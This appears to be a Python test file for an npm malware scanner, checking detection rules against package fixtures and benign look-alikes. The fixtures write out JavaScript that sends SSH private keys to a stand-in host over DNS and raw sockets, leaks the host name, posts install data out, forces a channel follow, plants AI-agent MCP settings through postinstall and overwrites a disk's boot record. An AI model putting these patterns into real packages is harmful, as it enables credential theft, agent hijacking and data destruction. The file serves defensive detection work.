"""Campaign behaviours of npm malware the study half's misses showed, and flow evidence in shipped
code (review 98, 17-PROOF-REVIEW: dev4-dev7, 2026-10-19).

Each is built as the behaviour, with inert stand-ins (`example.invalid`, a placeholder channel id),
and each comes with the ordinary code of the same shape that must stay quiet.
"""

from __future__ import annotations

from cordon_scanner.foundation.models import Severity
from unit.foundation.test_npm_work_half_classes import Npm

PLANT = (
    "const fs = require('fs');\nconst path = require('path');\n"
    "fs.cpSync(path.join(__dirname, 'template'), process.env.INIT_CWD, { recursive: true });\n"
)


class TestAgentConfigPlanted:
    RULE = "MALWARE.AGENT.CONFIG_PLANTED.001"

    def test_an_install_script_copying_an_mcp_server_list_into_the_project(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-plant",
            {"version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
            {
                "setup.js": PLANT,
                "template/.mcp.json": '{"mcpServers": {"x": {"command": "node", "args": ["s.js"]}}}',
                "template/.claude/settings.json": "{}",
            },
        )
        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL

    def test_an_install_script_copying_only_a_readable_template(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-qa-pack",
            {"version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
            {"setup.js": PLANT, "template/CLAUDE.md": "# Project notes\n"},
        )
        assert self.RULE not in Npm.findings(pkg)

    def test_a_scaffolder_a_person_runs_by_name(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-scaffold",
            {"version": "1.0.0", "bin": {"demo-scaffold": "setup.js"}},
            {"setup.js": PLANT, "template/.mcp.json": '{"mcpServers": {}}'},
        )
        assert self.RULE not in Npm.findings(pkg)


class TestAttributionCloak:
    RULE = "MALWARE.MOBILE.ATTRIBUTION_CLOAK.001"

    def test_install_attribution_reported_and_a_server_chosen_page(self, tmp_path) -> None:
        code = (
            "import appsFlyer from 'react-native-appsflyer';\nimport axios from 'axios';\n"
            "appsFlyer.onInstallConversionData((d) => axios.post('https://example.invalid/a', d));\n"
            "export const Page = ({ link }) => <WebView source={{ uri: link }} />;\n"
        )
        pkg = Npm.build(
            tmp_path, "demo-calc", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
        )
        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL

    def test_an_sdk_rendering_a_link_in_a_webview(self, tmp_path) -> None:
        code = "export const Room = ({ url }) => <WebView source={{ uri: url }} />;\n"
        pkg = Npm.build(
            tmp_path, "demo-video", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
        )
        assert self.RULE not in Npm.findings(pkg)


class TestChannelFollow:
    RULE = "MALWARE.ACCOUNT.CHANNEL_FOLLOW.001"
    CHANNEL = "120363" + "0" * 12 + "@newsletter"

    def test_a_messaging_library_made_to_follow_a_fixed_channel(self, tmp_path) -> None:
        code = f"const ids = ['{self.CHANNEL}'];\nmodule.exports = (sock) => ids.forEach((i) => sock.newsletterFollow(i));\n"
        pkg = Npm.build(
            tmp_path,
            "demo-wa",
            {"version": "1.0.0", "main": "lib/index.js"},
            {"lib/Socket/extra.js": code},
        )
        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL

    def test_a_bot_showing_a_channel_id_as_an_example(self, tmp_path) -> None:
        code = f"module.exports = {{ placeholder: '{self.CHANNEL}', label: 'Channel id' }};\n"
        pkg = Npm.build(
            tmp_path,
            "demo-node",
            {"version": "1.0.0", "main": "settings.js"},
            {"settings.js": code},
        )
        assert self.RULE not in Npm.findings(pkg)


class TestFlowIdentity:
    RULE = "SUSPECT.EXFIL.FLOW_IDENTITY.001"
    CODE = (
        "const os = require('os');\nconst https = require('https');\n"
        "const who = os.hostname();\nhttps.get('https://example.invalid/p?h=' + who);\n"
    )

    def test_the_host_name_followed_into_a_request(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-probe",
            {"version": "1.0.0", "main": "index.js"},
            {"index.js": self.CODE},
        )
        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) >= Severity.HIGH

    def test_the_same_code_in_a_test_file(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-probe",
            {"version": "1.0.0", "main": "index.js"},
            {"index.js": "", "test/net.js": self.CODE},
        )
        # Graded down as test code: reported, never blocking.
        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) < Severity.HIGH

    def test_shipped_as_the_package_main_it_is_not_lowered_as_build_output(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-probe",
            {"version": "1.0.0", "main": "dist/index.js"},
            {"dist/index.js": self.CODE},
        )
        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) >= Severity.HIGH

    def test_build_output_a_person_runs_as_a_command_keeps_its_ceiling(self, tmp_path) -> None:
        pkg = Npm.build(
            tmp_path,
            "demo-cli",
            {"version": "1.0.0", "main": "index.js", "bin": {"demo-cli": "dist/index.js"}},
            {"index.js": "", "dist/index.js": self.CODE},
        )
        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) < Severity.HIGH


class TestFlowRawChannel:
    RULE = "MALWARE.EXFIL.FLOW_RAW_CHANNEL.001"

    def test_a_home_directory_key_carried_in_a_dns_name(self, tmp_path) -> None:
        code = (
            "const fs = require('fs');\nconst os = require('os');\nconst dns = require('dns');\n"
            "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');\n"
            "dns.lookup(k.toString('hex').slice(0, 40) + '.example.invalid', () => {});\n"
        )
        pkg = Npm.build(
            tmp_path, "demo-raw", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
        )
        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL

    def test_a_home_directory_key_written_to_a_raw_socket(self, tmp_path) -> None:
        code = (
            "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n"
            "const k = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');\n"
            "const s = net.connect(9, 'example.invalid');\ns.write(k);\n"
        )
        pkg = Npm.build(
            tmp_path, "demo-raw", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
        )
        assert Npm.findings(pkg).get(self.RULE) == Severity.CRITICAL

    def test_a_home_file_read_and_kept_on_this_machine(self, tmp_path) -> None:
        code = (
            "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n"
            "const rc = fs.readFileSync(os.homedir() + '/.democlirc', 'utf8');\n"
            "fs.writeFileSync('settings.json', rc);\nnet.connect(9, 'example.invalid').end();\n"
        )
        pkg = Npm.build(
            tmp_path, "demo-cfg", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
        )
        assert self.RULE not in Npm.findings(pkg)


class TestSystemDiskWrite:
    """A wiper writing the first disk's boot record (review 98 P4 #5). Inert: the byte buffers are
    zeros and nothing here runs."""

    RULE = "SUSPECT.DESTROY.SYSTEM_DISK.001"

    def test_an_install_script_that_overwrites_the_first_disk(self, tmp_path) -> None:
        code = (
            "const fs = require('fs');\n"
            "const fd = fs.openSync('\\\\\\\\.\\\\PhysicalDrive0', 'r+');\n"
            "fs.writeSync(fd, Buffer.alloc(512), 0, 512, 0);\n"
        )
        pkg = Npm.build(
            tmp_path,
            "demo-disk",
            {"version": "1.0.0", "scripts": {"postinstall": "node setup.js"}},
            {"setup.js": code},
        )
        assert Npm.findings(pkg).get(self.RULE, Severity.INFO) >= Severity.HIGH

    def test_an_imager_writing_the_device_the_user_chose(self, tmp_path) -> None:
        code = (
            "const fs = require('fs');\n"
            "module.exports = (device, image) => {\n"
            "  const fd = fs.openSync(device.path, 'r+');\n"
            "  fs.writeSync(fd, fs.readFileSync(image));\n"
            "};\n"
        )
        pkg = Npm.build(
            tmp_path, "demo-imager", {"version": "1.0.0", "main": "index.js"}, {"index.js": code}
        )
        assert self.RULE not in Npm.findings(pkg)
